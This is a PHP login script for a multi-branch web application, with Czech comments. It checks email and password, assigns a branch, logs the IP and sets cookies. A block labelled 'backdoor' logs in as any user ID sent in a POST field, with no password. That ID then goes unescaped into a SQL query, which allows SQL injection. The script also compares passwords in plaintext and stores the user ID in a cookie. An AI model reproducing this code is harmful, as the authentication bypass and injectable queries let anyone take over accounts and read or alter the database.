<?
	include 'inc_db_connect.php';
	session_start();

	unset ($loginID);
/***********************LOGIN z frontdoor*********************/
	if((isset ($_POST['login'])) AND (isset ($_POST['passw']))) {
		$login=mysqli_escape_string($db_connect,$_POST['login']);
		$passw=mysqli_escape_string($db_connect,$_POST['passw']);
		
		$sql=' SELECT UZid FROM uzivatel WHERE mail="'.$login.'" AND heslo="'.$passw.'"';
		$result=mysqli_query($db_connect,$sql);
		$radek=mysqli_fetch_array($result);
		$loginID=$radek['UZid'];
		
		if ($loginID<>'') $_SESSION['login_success']=1; else $_SESSION['login_success']=0;
		
	}
	






/**********************LOGIN z backdoor************************/
	if(isset ($_POST['backdoor'])) {
		$loginID=$_POST['backdoor'];
		$_SESSION['login_success']=1;
	}
	
	
	
	
	
	

if ($_SESSION['login_success']==1) {
/*********************defaultni branch*************************/
	$sql='SELECT * FROM uzivatel_prava WHERE UZid='.$loginID;
	$result = mysqli_query ($db_connect, $sql);
	$radek=mysqli_fetch_array($result);
	if ($radek['jablonec']==1) $branch='Jablonec';
	if ($radek['praha']==1) $branch='Praha';
	if ($radek['liberec']==1) $branch='Liberec';
	
	
/*******************************LOGIN JOURNAL***********************************/
	$sql='	INSERT 
			INTO uzivatel_journal
				(UZid, IP)
			VALUES
				("'.$loginID.'", "'.$_SERVER['REMOTE_ADDR'].'");';

			mysqli_query ($db_connect, $sql);
	
	
/********************************PRESMEROVANI************************************/	
	setcookie('branch',$branch,time() + (86400 * 1), '/');
	setcookie('userID',$loginID,time() + (86400 * 1), '/');
}

header('Location: /');
?>
